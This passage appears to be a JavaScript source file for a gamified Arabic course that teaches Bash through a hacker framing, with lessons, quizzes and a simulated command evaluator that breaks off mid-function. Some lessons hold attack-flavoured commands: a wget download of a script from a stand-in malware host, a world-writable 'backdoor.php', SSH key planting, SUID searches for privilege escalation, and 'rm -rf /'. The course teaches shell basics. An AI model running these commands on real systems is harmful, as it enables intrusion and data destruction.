import {
    Terminal, Zap, Folder, FileText, Search, Shield, Activity, Globe
} from 'lucide-react';

export const BASH_THEORY_SLIDES = [
    {
        icon: Terminal, color: '#ff006e',
        title: 'المترجم بينك وبين النواة (Kernel)',
        desc: 'الـ Bash ليس النظام بحد ذاته، بل هو نافذة التخاطب بينك (المستخدم) وبين عقل النظام (Kernel). عندما تكتب أمراً، يقوم Bash بترجمته إلى نبضات يفهمها المعالج.'
    },
    {
        icon: Globe, color: '#7112AF',
        title: 'لماذا لا نستخدم الفأرة؟',
        desc: 'في الأمن السيبراني وإدارة السيرفرات السحابية، الأجهزة غالباً تكون بدون واجهة رسومية لتقليل استهلاك الموارد وتقليل الثغرات. لذلك، التحكم السطري عبر Bash هو الطريقة الوحيدة والأسرع.'
    },
    {
        icon: Zap, color: '#eab308',
        title: 'قوة الأوامر المركبة',
        desc: 'بعكس الواجهات الرسومية، في الـ Terminal يمكنك الجمع بين عشرات الأدوات بضغطة زر واحدة (باستخدام العلامات والروابط) لأداء مهام قد تستغرق ساعات بالطرق العادية.'
    },
    {
        icon: Shield, color: '#10b981',
        title: 'لغة المخترقين',
        desc: 'كل أدوات الاختراق واكتشاف الثغرات مصممة لتعمل عبر الـ Terminal. إتقانك له هو خطوتك الأولى الحقيقية في هذا المجال.'
    }
];

export const CURRICULUM = {
    // المستوى الأول
    level1: {
        id: 'level1', title: 'المستوى الأول: استكشاف البيئة (The Navigator)', subtitle: 'كسر رهبة الشاشة السوداء', color: '#240993', icon: Terminal,
        description: 'معرفة أين تقف في النظام وكيف تستعرض محيطك.',
        lessons: [
            {
                id: 1, title: 'تحديد الموقع الحالي', concept: 'المخترق يجب ألا يضيع. إذا لم تعرف أين أنت، فلن تعرف كيف تتقدم.',
                subTasks: [
                    { id: '1a', command: 'pwd', task: 'استخدم أمر طباعة المسار لمعرفة أين أنت.', hint: 'اكتب pwd واضغط Enter', xp: 10, question: { text: 'ما هو المسار المطبوع على الشاشة؟', options: ['/', '/home/student', '/root', '/var/www'], answer: '/home/student' }, details: { path: '/bin/pwd', usage: 'Print Working Directory', desc: 'يطبع المسار الكامل من الجذر (/) وحتى المجلد الحالي. يعتبر من أهم الأوامر لمعرفة موقعك الفعلي داخل خوادم الضحايا.' } }
                ]
            },
            {
                id: 2, title: 'عرض المحتويات (ls)', concept: 'مثل تشغيل كشاف في غرفة مظلمة لترى الصناديق التي حولك.',
                subTasks: [
                    { id: '2a', command: 'ls', task: 'اعرض محتويات المجلد الحالي بشكل عادي.', hint: 'استخدم ls', xp: 10, question: null, details: { path: '/bin/ls', usage: 'List Directory Contents', desc: 'يقوم بسرد أسماء الملفات داخل المسار. يعمل هذا الأمر برمجياً باستدعاء دالة النظام readdir لقراءة محتويات المجلد المراد.' } },
                    { id: '2b', command: 'ls -a', task: 'اكشف الملفات المخفية (بداية التجسس).', hint: 'استخدم ls -a', xp: 15, question: { text: 'ما هو اسم المجلد المخفي الذي ظهر للتو؟', options: ['.hidden_folder', '.secret_config', '.git', '.bashrc'], answer: '.secret_config' }, details: { path: '/bin/ls', usage: 'List All (Including Hidden)', desc: 'في أنظمة لينكس، أي ملف يبدأ بنقطة (.) يعتبر مخفياً. خيار -a يجبر أداة ls على تجاهل هذه القاعدة السطحية وعرض كل شيء بلا استثناء.' } },
                    { id: '2c', command: 'ls -lh', task: 'عرض الحجم والتفاصيل بشكل مقروء للبشر.', hint: 'استخدم ls -lh', xp: 15, question: null, details: { path: '/bin/ls', usage: 'List Long format, Human readable sizes', desc: 'يجمع بين -l للقائمة الطويلة (الحقوق، الصلاحيات، الملكية) و -h لجعل الأحجام مقروءة بـ (KB, MB, GB) بدلاً من البايتات المجردة.' } },
                    { id: '2d', command: 'ls -R', task: 'عرض المجلدات الفرعية (شجرة النظام).', hint: 'استخدم ls -R (R كابيتال)', xp: 20, question: { text: 'ما هو المجلد الفرعي الذي ظهر بداخل folder1؟', options: ['data', 'bin', 'nested_dir', 'etc'], answer: 'nested_dir' }, details: { path: '/bin/ls', usage: 'List Recursively', desc: 'يدخل لكل مجلد يجده، ويسرد محتوياته، وإذا وجد مجلداً آخر يدخله أيضاً وهكذا حتى يصل لنهاية الشجرة. ممتاز لاكتشاف هيكل الملفات بسرعة.' } }
                ]
            },
            {
                id: 3, title: 'التنقل بين المسارات (cd)', concept: 'فتح الأبواب والانتقال بين الغرف للوصول إلى هدفك.',
                subTasks: [
                    { id: '3a', command: 'cd data', task: 'ادخل لمجلد data.', hint: 'استخدم cd data', xp: 10, question: null, details: { path: 'Shell Built-in', usage: 'Change Directory', desc: 'هذا الأمر غريب لأنه لا يوجد كملف تنفيذي حقيقي (/bin/cd). الـ cd مدموج أساساً بلغة الجدار (Shell) نفسها لأنه يغير بيئة الـ Terminal الحالية.' } },
                    { id: '3b', command: 'cd ..', task: 'العودة للخلف للمجلد السابق.', hint: 'استخدم cd .. بمسافة', xp: 10, question: null, details: { path: 'Shell Built-in', usage: 'Change to Parent Directory', desc: 'الرمز (..) يمثل المجلد الأب (الذي يحتوي المجلد الحالي). هذا الرمز موجود دائماً في كل مجلد كدليل للرجوع للخلف.' } },
                    { id: '3c', command: 'cd ~', task: 'العودة فورا للمنزل (Home).', hint: 'استخدم cd ~', xp: 10, question: null, details: { path: 'Shell Built-in', usage: 'Change to Home Directory', desc: 'الرمز (~) مخزن في الذاكرة (Environment Variable) ليمثل مسار المستخدم الافتراضي (مثلاً /home/student). يتيح لك العودة السريعة أياً كان عمق مسارك الحالي.' } },
                    { id: '3d', command: 'cd -', task: 'التبديل السريع بين آخر مكانين كنت فيهما.', hint: 'استخدم cd -', xp: 15, question: { text: 'إلى أين عدت بهذا الأمر؟', options: ['للخلف مجلد واحد', 'للمسار الجذر /', 'للمسار السابق مباشرة', 'مجلد المنزل'], answer: 'للمسار السابق مباشرة' }, details: { path: 'Shell Built-in', usage: 'Change to Previous Directory', desc: 'يقرأ السطح الخلفي لـ (OLDPWD) المتغير المحفوظ للقفز فوراً إلى المسار الذي كنت تتواجد فيه قبل هذا كزر العودة في المتصفح.' } }
                ]
            }
        ]
    },
    // المستوى الثاني
    level2: {
        id: 'level2', title: 'المستوى الثاني: التلاعب بالملفات (File Manipulation)', subtitle: 'التحكم الكامل والهيكلة', color: '#7112AF', icon: Folder,
        description: 'القدرة على إنشاء وتعديل ونقل البيانات بمرونة.',
        lessons: [
            {
                id: 4, title: 'الإنشاء (Creation)', concept: 'المهندس يبني الأساسات. يمكنك إنشاء غرف (مجلدات) ووثائق (ملفات) بضغطة زر.',
                subTasks: [
                    { id: '4a', command: 'mkdir tools', task: 'أنشئ مجلداً باسم tools.', hint: 'استخدم mkdir', xp: 10, question: null, details: { path: '/bin/mkdir', usage: 'Make Directory', desc: 'يبني مجلداً جديداً برمجياً، إذا كان الاسم يحتوي على مسافات يجب وضعه بين تنصيص "my folder"، وإلا سينشئ مجلدين باسم my و folder.' } },
                    { id: '4b', command: 'mkdir -p project/src', task: 'أنشئ مساراً كاملاً (مجلد داخل مجلد) دفعة واحدة.', hint: 'استخدم mkdir -p للحفظ التنازلي', xp: 15, question: { text: 'ماذا تعني علامة -p؟', options: ['parent directories', 'print', 'permission', 'process'], answer: 'parent directories' }, details: { path: '/bin/mkdir', usage: 'Make Parent Directories', desc: 'يُجري النظام اختباراً: إذا لم يكن المجلد project موجوداً سينشئه أولاً ثم يبني داخله مسار src، بدلاً من إرجاع خطأ.' } },
                    { id: '4c', command: 'touch payload.txt', task: 'أنشئ ملفاً نصياً فارغاً.', hint: 'استخدم touch', xp: 10, question: null, details: { path: '/usr/bin/touch', usage: 'Update Timestamps (or create empty payload)', desc: 'السر في أداة touch هو أنها تستخدم لتحديث "وقت فتح/تعديل" الملف للهروب من التتبع، ولكن كأثر جانبي إذا كان الملف غير موجود ستقوم بإنشائه فارغاً كحيلة ذكية.' } }
                ]
            },
            {
                id: 5, title: 'النسخ والنقل (Copy & Move)', concept: 'استنساخ المستندات وتغيير أسمائها أو مواقعها بسرعة للمراوغة.',
                subTasks: [
                    { id: '5a', command: 'cp payload.txt backup.txt', task: 'نسخ ملف payload.txt إلى backup.txt.', hint: 'استخدم cp', xp: 10, question: null, details: { path: '/bin/cp', usage: 'Copy files and directories', desc: 'يقوم بقراءة بيانات الملف الأصلي بالبايتات وكتابتها في عنوان جديد كلياً على القرص الصلب، بحيث يصبح متصلاً مستقلاً.' } },
                    { id: '5b', command: 'cp -r tools old_tools', task: 'نسخ مجلد كامل بكل محتوياته.', hint: 'استخدم cp -r (-r تعني recursive)', xp: 15, question: null, details: { path: '/bin/cp', usage: 'Copy Recursively', desc: 'لا يمكنك استنساخ مجلد فارغ بسهولة، خيار -r يجبر الأداة على الدخول للصندوق أعمق للنسخ تدريجياً.' } },
                    { id: '5c', command: 'mv backup.txt hidden.txt', task: 'أعد تسمية ملف أو انقله، جرب إعادة تسميته إلى hidden.txt.', hint: 'استخدم mv قديم جديد', xp: 15, question: null, details: { path: '/bin/mv', usage: 'Move or Rename', desc: 'في النواة (Kernel)، عملية النقل وإعادة التسمية هي عملية واحدة تسمى (rename) لتحديث الروابط فقط دون تحريك فعلي للداتا الثقيلة.' } }
                ]
            },
            {
                id: 6, title: 'الحذف (Deletion)', concept: 'امسح آثارك تماماً وتخلص من الزيادات.',
                subTasks: [
                    { id: '6a', command: 'rm hidden.txt', task: 'حذف ملف.', hint: 'استخدم rm', xp: 10, question: null, details: { path: '/bin/rm', usage: 'Remove files or directories', desc: 'أمر rm لا يحذف البيانات فعلياً من نظام التخزين بمجرد استخدامه؛ بل يمسح الرابط الدليلي (Inode) للملف ليتم الكتابة فوقه لاحقاً. يمكن استرجاعه في بعض الأحيان.' } },
                    { id: '6b', command: 'rm -rf old_tools', task: 'حذف مجلد بالقوة بدون تراجع (احذر!).', hint: 'استخدم rm -rf واسم المجلد', xp: 20, question: { text: 'ماذا سيحدث لو نفذت rm -rf / كمسؤول؟', options: ['سيتم مسح الشاشة', 'سيتم إطفاء الجهاز', 'سيتم مسح نظام التشغيل بالكامل', 'لا شيء'], answer: 'سيتم مسح نظام التشغيل بالكامل' }, details: { path: '/bin/rm', usage: 'Remove Recursively and Forcefully', desc: 'الأمر المرعب (-r للحذف المتسلسل للأعماق، و -f للحذف الإجباري بلا تحذيرات)، استخدامه كـ (root) على المسارات الحساسة يدمر الجهاز كلياً.' } }
                ]
            }
        ]
    },
    // المستوى الثالث
    level3: {
        id: 'level3', title: 'المستوى الثالث: استخراج المعلومات (Data Mining)', subtitle: 'البحث عن الإبرة في كومة القش', color: '#ff006e', icon: Search,
        description: 'قراءة السجلات والبحث عن كلمات سر أو تفاصيل داخل الملفات.',
        lessons: [
            {
                id: 7, title: 'القراءة السريعة', concept: 'كيف تستعرض الملفات بدلاً من فتحها ببرامج ثقيلة.',
                subTasks: [
                    { id: '7a', command: 'cat passwords.txt', task: 'عرض الملف كاملاً بالشاشة.', hint: 'استخدم cat لطباعة المحتوى', xp: 10, question: null, details: { path: '/bin/cat', usage: 'Concatenate and print files', desc: 'الاسم مشتق من (Concatenate). فكرته الأساسية سكب كل ما في الملف على شاشتك المعتمة مباشرة دون معالجة.' } },
                    { id: '7b', command: 'head -n 2 passwords.txt', task: 'عرض أول سطرين فقط.', hint: 'استخدم head -n 2', xp: 15, question: null, details: { path: '/usr/bin/head', usage: 'Output the first part of files', desc: 'مناسب للنظر لملفات الأكواد ومعرفة معلوماتها وتراخيصها، أو عرض عناوين الأعمدة في جداول البيانات السريعة السطرية.' } },
                    { id: '7c', command: 'tail -f dev.log', task: 'مراقبة نهاية الملف لحظياً (كأنه يتدفق).', hint: 'استخدم tail -f', xp: 15, question: { text: 'فيم يستخدم خيار tail -f عادة في السيرفرات؟', options: ['لمسح الملفات', 'لسماع الموسيقى', 'لمراقبة سجلات السيرفر (Logs) لحظياً', 'تحميل البيانات'], answer: 'لمراقبة سجلات السيرفر (Logs) لحظياً' }, details: { path: '/usr/bin/tail', usage: 'Output the last part of files', desc: 'خيار (-f للاختصار Follow) يربط العملية بالملف ويستمر بطباعة كل مستجدات تحدث عليه لحظياً، وهو سر مراقبة محاولات الاختراق.' } }
                ]
            },
            {
                id: 8, title: 'البحث المتقدم (grep)', concept: 'أداة القنص! تجد الكلمات بدقة وسرعة عجيبة.',
                subTasks: [
                    { id: '8a', command: 'grep "admin" passwords.txt', task: 'ابحث عن كلمة admin في الملف.', hint: 'استخدم grep واسم الكلمة والملف', xp: 10, question: null, details: { path: '/bin/grep', usage: 'Global Regular Expression Print', desc: 'أشهر أداة فلترة. يقرأ الملف سراً ويطبع لك فقط الأسطر التي تحتوي على النص المحدد. منقذ لبيانات الـ Configs الصعبة.' } },
                    { id: '8b', command: 'grep -i "AdMiN" passwords.txt', task: 'ابحث بتجاهل حالة الأحرف الصارمة.', hint: 'استخدم grep -i', xp: 15, question: null, details: { path: '/bin/grep', usage: 'Case-Insensitive Global Registration Match', desc: 'خيار (-i) يجعل البحث متساهلاً، إذا كان الملف به كلمة aDmIn سيلتقطها كما لو كانت ADMIN. وهو أقوى في الاختراق.' } },
                    { id: '8c', command: 'grep -r "password" data/', task: 'ابحث عن كلمة داخل كل ملفات مجلد معين.', hint: 'استخدم grep -r', xp: 20, question: null, details: { path: '/bin/grep', usage: 'Recursive Pattern Search', desc: 'يقوم بمهمتين: يبحث داخل المجلدات وداخل جميع الملفات في آن واحد ليخرج لك "اسم الملف: مكان تواجد الكلمة"، ممتاز لاستخراج المفاتيح المنسية بالاكواد.' } }
                ]
            },
            {
                id: 9, title: 'الإحصاء والفرز', concept: 'لتحليل البيانات يجب عليك القدرة على فرزها وحسابها.',
                subTasks: [
                    { id: '9a', command: 'wc -l passwords.txt', task: 'عد الأسطر لمعرفة كم مستخدم موجود.', hint: 'استخدم wc -l لعد الأسطر (Lines)', xp: 15, question: { text: 'كم عدد أسطر الملفات المكتشفة في رسالة المخرجات؟', options: ['0', '1', '4', '8'], answer: '4' }, details: { path: '/usr/bin/wc', usage: 'Word Count (and lines)', desc: 'يحسب عدد البايتات والكلمات والأسطر. يستخدم خيار (-l) خصيصاً لعد الأسطر وهو مثالي لمعرفة عدد السجلات المستخرجة بنصف ثانية.' } },
                    { id: '9b', command: 'sort ips.list', task: 'ترتيب البيانات أبجديا.', hint: 'استخدم sort على ملف ips.list', xp: 10, question: null, details: { path: '/usr/bin/sort', usage: 'Sort lines of text files', desc: 'الترتيب يعتمد الأساس الرقمي والأبجدي (ASCII). يستخدم مع كلمات السر والأرقام لإيجاد النمط أو تحويل العشوائية لنظام متتابع.' } },
                    { id: '9c', command: 'uniq sorted_ips.list', task: 'إزالة الأسطر المتكررة (شرط أن تكون مرتبة أولا).', hint: 'استخدم uniq', xp: 15, question: null, details: { path: '/usr/bin/uniq', usage: 'Report or omit repeated lines', desc: 'يقارن السطر الحالي بالذي أعلاه فقط، لذا وجب الترتيب بـ (sort) لكي تزول كافة التكرارات ويصبح لكل سجل إدخال فريد غير متكرر.' } }
                ]
            }
        ]
    },
    // المستوى الرابع
    level4: {
        id: 'level4', title: 'المستوى الرابع: الأذونات والسيادة (Permissions & Identity)', subtitle: 'من يملك ماذا؟', color: '#10b981', icon: Shield,
        description: 'اكتشف قدراتك المحدودة وتعلم كيف تمنح/تسلب الصلاحيات.',
        lessons: [
            {
                id: 10, title: 'كشف الهوية', concept: 'من أنت في نظر النظام؟ وما هو رقم هويتك؟',
                subTasks: [
                    { id: '10a', command: 'whoami', task: 'اسأل النظام عن اسم المستخدم الخاص بك.', hint: 'who am i؟', xp: 10, question: { text: 'ما هو اسم المستخدم الذي ظهر لك؟', options: ['root', 'admin', 'student', 'guest'], answer: 'student' }, details: { path: '/usr/bin/whoami', usage: 'Print effective user ID', desc: 'الأمر البسيط المفضل بعد أي صعود صلاحية ناجح (Privilege Escalation)، لأنه يثبت أنك أصبحت المسؤول الفعلي أو شخصاً آخر.' } },
                    { id: '10b', command: 'id', task: 'اعرض رقم الـ UID الخاص بك ورمز المجموعة GID.', hint: 'استخدم id', xp: 15, question: { text: 'حسب المخرجات، ما هو رقم UID للمستخدم student؟', options: ['0', '1000', '500', '1001'], answer: '1000' }, details: { path: '/usr/bin/id', usage: 'Print real and effective user and group identities', desc: 'الأهم من الاسم هو الـ ID. المهاجم يبحث دوماً عن UID=0 (الـ root) لأنه الوحيد الذي يتجاوز جميع خطوط الدفاع في النواة (Kernel).' } }
                ]
            },
            {
                id: 11, title: 'تعديل الصلاحيات (chmod)', concept: 'تحكم في من يستطيع القراءة، أو التعديل، أو تشغيل الملف.',
                subTasks: [
                    { id: '11a', command: 'chmod +x script.sh', task: 'اجعل الملف أداة قابلة للتنفيذ (Execution).', hint: 'استخدم chmod +x واسم الملف', xp: 15, question: null, details: { path: '/bin/chmod', usage: 'Change Mode/Permissions (+Executable)', desc: 'الملف أو البرنامج الذي تصنعه مهما بلغت خطورته لن يعمل في لينكس دون هذه التعليمة السحرية الصريحة التي تخبر لنواة بأنه برنامج ويسمح له بالعمل.' } },
                    { id: '11b', command: 'chmod 600 key.pem', task: 'شفر الملف للقراءة والتعديل للمالك فقط (أساس مفاتيح SSH).', hint: 'استخدم chmod 600', xp: 20, question: { text: 'ماذا يعني الرقم 6 في صياغة الصلاحيات؟', options: ['تنفيذ فقط', 'قراءة وكتابة (4+2)', 'قراءة فقط', 'الكل'], answer: 'قراءة وكتابة (4+2)' }, details: { path: '/bin/chmod', usage: 'Octal Numeric Modes (600)', desc: 'قراءة=4، كتابة=2، تنفيذ=1. مجموع الـ 6 يعني (قراءة+كتابة للمالك). الصفر المزدوج يسلب جميع الصلاحيات من الجميع عدا المالك!' } },
                    { id: '11c', command: 'chmod 777 backdoor.php', task: 'فتح الملف للجميع (ثغرة أمنية شديدة الخطورة).', hint: 'استخدم chmod 777', xp: 15, question: null, details: { path: '/bin/chmod', usage: 'Read, Write, and Execute for all (777)', desc: 'رقم الشيطان في لينكس (777). يعني الجميع يضيف، يعدل، ينفذ. خطأ كارثي يستخدمه المبتدئون لإصلاح أخطاء الوصول (Access Denied) ويدمرون السيرفرات.' } }
                ]
            },
            {
                id: 12, title: 'تغيير الملكية (chown)', concept: 'هذا الملف كان لي، والآن أصبح لك.',
                subTasks: [
                    { id: '12a', command: 'chown root:root script.sh', task: '(محاكاة) نقل ملكية الملف للمسؤول الأعلى.', hint: 'استخدم chown user:group واسم الملف', xp: 20, question: null, details: { path: '/bin/chown', usage: 'Change File Owner and Group', desc: 'يغير هوية المالك للملف. في الحقيقة يحتاج تنفيذ هذا الأمر ذاته لصلاحيات عليا (sudo) لأنه يمكنك من السيطرة الكلية على الملفات الحساسة والتلاعب بها.' } }
                ]
            }
        ]
    },
    // المستوى الخامس
    level5: {
        id: 'level5', title: 'المستوى الخامس: العمليات والشبكة (Systems & Networking)', subtitle: 'شريان الجهاز', color: '#eab308', icon: Activity,
        description: 'مراقبة ما يجري في عقل الجهاز والاتصال بالعالم الخارجي.',
        lessons: [
            {
                id: 13, title: 'إدارة العمليات (Processes)', concept: 'ما هي البرامج المخفية التي تعمل بالخلفية وكيف تقتلها بتعسف.',
                subTasks: [
                    { id: '13a', command: 'ps aux', task: 'رؤية كل العمليات التي تعمل الآن مع استخدامها.', hint: 'استخدم ps aux', xp: 15, question: null, details: { path: '/bin/ps', usage: 'Snapshot of current processes', desc: 'خيار "a" للجميع، "u" لمعلومات المالك، "x" لكشف عمليات الخلفية الغامضة (Daemons). أدوات التلغيم والسرقة كـ (Ransomware) تظهر كعمليات خفية هنا.' } },
                    { id: '13b', command: 'top', task: 'استعرض لوحة تحكم حية لاستهلاك الموارد.', hint: 'اكتب top', xp: 10, question: null, details: { path: '/usr/bin/top', usage: 'Dynamic real-time view of running processes', desc: 'يراقب الرام (RAM) والمعالج (CPU). إذا كانت استضافة النادي تتعرض لهجوم DDoSS، سيكون مؤشر الـ Load هنا عالياً جداً، وستكتشفه بالـ top فورا.' } },
                    { id: '13c', command: 'kill -9 1337', task: 'إنهاء عملية مشبوهة ورقمها 1337 بالقوة المفرطة.', hint: 'kill -9 واسم الـ PID', xp: 20, question: { text: 'الرقم 1337 هو رقم ماذا في نظام الإدارة؟', options: ['منفذ Port', 'رقم هوية المستخدم UID', 'رقم هوية العملية PID', 'رقم IP'], answer: 'رقم هوية العملية PID' }, details: { path: '/bin/kill', usage: 'Send a signal to a process (SIGKILL / 9)', desc: 'يرسل إشارة للنواة. رقم 9 يعني SIGKILL: الموت المستعجل الذي يصدر أمره المعالج للملف ولا يستطيع البرنامج تجاهله أبداً ويتم قتله فورا بدمغة.' } }
                ]
            },
            {
                id: 14, title: 'فحص الشبكة', concept: 'تحديد منافذك ومعرفة إن كان السيرفر الهدف حياً.',
                subTasks: [
                    { id: '14a', command: 'ip addr', task: 'معرفة الـ IP الخاص بك محلياً.', hint: 'استخدم ip addr', xp: 15, question: null, details: { path: '/sbin/ip', usage: 'Show / manipulate routing, network devices', desc: 'بديل (ifconfig) القديم. يتيح لك رؤية كروت الشبكة المختلفة ومن ضمنها الـ Loopback أو واجهات الـ Ethernet لتتأكد من عناوينك التي سيتبادل معها الهجوم.' } },
                    { id: '14b', command: 'ss -tunlp', task: 'كشف المنافذ المفتوحة للتنصت (Ports).', hint: 'استخدم ss -tunlp', xp: 20, question: { text: 'من مخرجات أمر ss، أي منفذ يعمل عليه بروتوكول SSH المتوقع؟', options: ['80', '443', '22', '3306'], answer: '22' }, details: { path: '/usr/bin/ss', usage: 'Socket Statistics (Dump socket info)', desc: 'مثل (netstat) لكنه أسرع. يعرض البروتوكول (t لـ tcp و u لـ udp)، الروابط المفتوحة للسماع (l) والمنافذ (n)، واسم البرنامج (p) للربط الدقيق والمراقبة.' } },
                    { id: '14c', command: 'ping 8.8.8.8', task: 'فحص الاتصال بسيرفر خارجي لمعرفة توفره.', hint: 'استخدم ping ورقم الأيبي', xp: 15, question: null, details: { path: '/bin/ping', usage: 'Send ICMP ECHO_REQUEST to network hosts', desc: 'يرسل بروتوكولات حزم صغيرة (ICMP) وينتظر الرد. يعطي أزمنة الرد وقيم الحزم المفقودة، يستخدم لتشخيص الأعطال وكشف حظر الجدران النارية للصادرات.' } }
                ]
            },
            {
                id: 15, title: 'جلب البيانات', concept: 'الحديث مع الروابط وجلب الأدوات.',
                subTasks: [
                    { id: '15a', command: 'curl http://example.com', task: 'جلب الكود المصدري للصفحة.', hint: 'استخدم curl والتابع', xp: 15, question: null, details: { path: '/usr/bin/curl', usage: 'Transfer a URL', desc: 'مكتبة هائلة لجلب البيانات. بدلاً من تحميل الموقع كمتصفح، يأتي لك بالـ (Headers والرد البرمجي والـ HTML). سلاح المهاجم لإرسال Payload بالطلبات، وللإشراف على السيرفرات.' } },
                    { id: '15b', command: 'wget http://malware.com/virus.sh', task: 'تحميل ملف/أداة من الإنترنت للمجلد الحالي.', hint: 'استخدم wget', xp: 20, question: null, details: { path: '/usr/bin/wget', usage: 'Non-interactive network downloader', desc: 'يعمل بالخفاء وتلقائياً ليحمل ملفك، يستخدمه القراصنة لتحميل أدواتهم الضارة (Malware) داخل الجهاز المخترق لاستيراد أدوات المتابعة من مصادرهم.' } }
                ]
            }
        ]
    },
    // المستوى السادس
    level6: {
        id: 'level6', title: 'المستوى السادس: الاحتراف (The Power User)', subtitle: 'دمج السحر للضرب بسطر واحد', color: '#ff5c00', icon: Zap,
        description: 'أقوى أسلوب في الـ Bash للربط، الضغط، والبحث المعقد.',
        lessons: [
            {
                id: 16, title: 'الربط (Piping & Redirection)', concept: 'استخدم المخرجات من برنامج كمدخل مباشر للآخر، وسجل الباقي.',
                subTasks: [
                    { id: '16a', command: 'ls | grep txt', task: 'اعرض الملفات ومررها على منخل grep لفلترة النصوص فقط.', hint: 'استخدم |', xp: 15, question: null, details: { path: 'Shell Core Feature', usage: 'UNIX Pipeline', desc: 'المعجزة الحقيقية، الأنبوب (|) يأخذ مخرجات الأمر الأول (stdout) ليجعلها مدخلات فعلية للأمر الثاني (stdin). هذا ما يقود لقوة أوامر باش اللانهائية.' } },
                    { id: '16b', command: 'echo "root access" > key', task: 'توجيه النص لملف باسم key لمسح محتواه القديم إن وجد.', hint: 'استخدم علامة >', xp: 15, question: null, details: { path: 'Shell Core Feature', usage: 'Output Redirection (Overwrite)', desc: 'علامة التوجيه الأولى (>) تعني (امسح الملف نهائياً واصنع واحداً جديداً يحوي مدخلاتي الجديدة). إن كان لكلمة دمار في لينكس، فهذا الرمز هو أساسه غير المهتم.' } },
                    { id: '16c', command: 'echo "backdoor" >> key', task: 'إضافة نص للملف بدون مسح القديم.', hint: 'استخدم علامة >>', xp: 15, question: null, details: { path: 'Shell Core Feature', usage: 'Output Redirection (Append)', desc: 'العلامة المزدوجة (>>) أرقّ حيث تعني (احفظ القديم، وألصق سطر الجديد بالنهاية). هذه هي الطريقة المستخدمة لزرع مفاتيح SSH دون تعطيل القديمة.' } }
                ]
            },
            {
                id: 17, title: 'الأرشفة والضغط', concept: 'حزم ملفات الاختراق ودمجها للتهريب.',
                subTasks: [
                    { id: '17a', command: 'tar -czvf tools.tar.gz tools/', task: 'ضغط مجلد الأدوات لسهولة رفعه أو نقله لضحية أخرى.', hint: 'استخدم القالب tar -czvf اسم_الملف المجلد', xp: 25, question: { text: 'الحرف z في tar يرمز لخيارات الضغط بأي صيغة؟', options: ['zip', 'rar', 'gzip', '7z'], answer: 'gzip' }, details: { path: '/bin/tar', usage: 'Tape Archive (bundle files)', desc: 'أرشيف الشرائط قديماً؛ c=Create, z=Gzip, v=Verbose, f=File. هو المعيار الذهبي لحزم المجلدات وتصغير حجمها لتهريبها من أجهزة الضحايا.' } },
                    { id: '17b', command: 'zip -e secret.zip passwords.txt', task: 'إنشاء ملف مضغوط بكلمة مرور (مشفر).', hint: 'استخدم zip -e', xp: 20, question: null, details: { path: '/usr/bin/zip', usage: 'Package and compress (ZIP)', desc: 'صيغة ZIP الشهيرة الويندوزية. يوفر (-e) تشفيراً للمحتوى بحيث حتى من اختار سرقة الملف، سيحتاج للمرور بالرقم السري أو كسره بالأدوات (Brute force).' } }
                ]
            },
            {
                id: 18, title: 'البحث الاحترافي (find)', concept: 'بحث مخالب النسور على الثغرات أو الملفات القديمة المعطوبة للقفز عبرها.',
                subTasks: [
                    { id: '18a', command: 'find / -perm -4000', task: 'البحث عن ملفات SUID الخطيرة في مسرى الجذر (صلاحيات تصعيد).', hint: 'اكتب الأمر حرفياً find / -perm -4000', xp: 40, question: { text: 'لماذا يبحث المخترق عن ملفات SUID؟', options: ['للترفيه', 'ليمسحها بوضوح', 'لأنها تعمل بصلاحيات مالكها (غالباً root) مما يتيح تصعيد الصلاحيات', 'لتسريع الانترنت'], answer: 'لأنها تعمل بصلاحيات مالكها (غالباً root) مما يتيح تصعيد الصلاحيات' }, details: { path: '/usr/bin/find', usage: 'Search for files in a directory hierarchy', desc: 'الأمر المرعب بحق. خيار (-perm -4000) يبحث عن ملفات تملك SUID Flag، أي برامج عادية بمجرد أن يشغلها مستخدم عادي يتم إعطاؤه صلاحية مؤقته بصلاحية صانع الملف، وبها يمكن العبث بذاكرة البرنامج للسيطرة كتروجان خفي.' } }
                ]
            }
        ]
    }
};

export const evaluateCommand = (command, fileSystem, activeSubTask) => {
    const trimmedCommand = command.trim().replace(/\s+/g, ' ');
    const parts = trimmedCommand.split(' ');
    const baseCommand = parts[0];
    const args = parts.slice(1);

    let output = '';
    let success = false;
    let newFileSystem = { ...fileSystem };

    switch (baseCommand) {
        // ========== Level 1: Navigator ==========
        case 'pwd':
            output = newFileSystem.currentPath;
            if (activeSubTask?.command === 'pwd') success = true;
            break;

        case 'ls':
            if (trimmedCommand === 'ls -la' || trimmedCommand === 'ls -al' || trimmedCommand === 'ls -l') {
                output = "drwxr-xr-x 2 student student 4096 Jan 1 .\ndrwxr-xr-x 3 root    root    4096 Jan 1 ..\ndrwxr-xr-x 2 student student 4096 Jan 1 .secret_config\n-rw-r--r-- 1 student student   15 Jan 1 passwords.txt\n-rwxr-xr-x 1 student student 1024 Jan 1 script.sh\ndrwxr-xr-x 2 student student 4096 Jan 1 data\ndrwxr-xr-x 2 student student 4096 Jan 1 tools";
                if (['ls -la', 'ls -al', 'ls -l'].includes(activeSubTask?.command)) success = true;
            } else if (trimmedCommand === 'ls -lh') {
                output = "-rw-r--r-- 1 student student 15B Jan 1 passwords.txt\ndrwxr-xr-x 2 student student 4.0K Jan 1 data";
                if (activeSubTask?.command === 'ls -lh') success = true;
            } else if (trimmedCommand === 'ls -R') {
                output = ".:\npasswords.txt  script.sh  data  folder1\n\n./folder1:\nnested_dir\n\n./folder1/nested_dir:\nfile.txt";
                if (activeSubTask?.command === 'ls -R') success = true;
            } else if (trimmedCommand === 'ls -a') {
                output = ['.', '..', ...newFileSystem.files, ...newFileSystem.hiddenFiles].join('  ');
                if (activeSubTask?.command === 'ls -a') success = true;
            } else if (trimmedCommand === 'ls') {
                output = newFileSystem.files.join('  ');
                if (activeSubTask?.command === 'ls') success = true;
            } else if (trimmedCommand === 'ls | grep txt') {
                output = 'passwords.txt';
                if (activeSubTask?.command === 'ls | grep txt') success = true;
            } else {
                output = `ls: invalid option or spacing`;
            }
            break;

        case 'cd':
            if (trimmedCommand === 'cd ..') {
                const parentPath = newFileSystem.currentPath.split('/').slice(0, -1).join('/') || '/';
                newFileSystem.currentPath = parentPath;
                output = `Moved to ${parentPath}`;
                if (activeSubTask?.command === 'cd ..') success = true;
            } else if (trimmedCommand === 'cd ~') {
                newFileSystem.currentPath = '/home/student';
                output = `Moved to home directory`;
                if (activeSubTask?.command === 'cd ~') success = true;
            } else if (trimmedCommand === 'cd -') {
                newFileSystem.currentPath = '/home/student/previous';
                output = `/home/student/previous`;
                if (activeSubTask?.command === 'cd -') success = true;
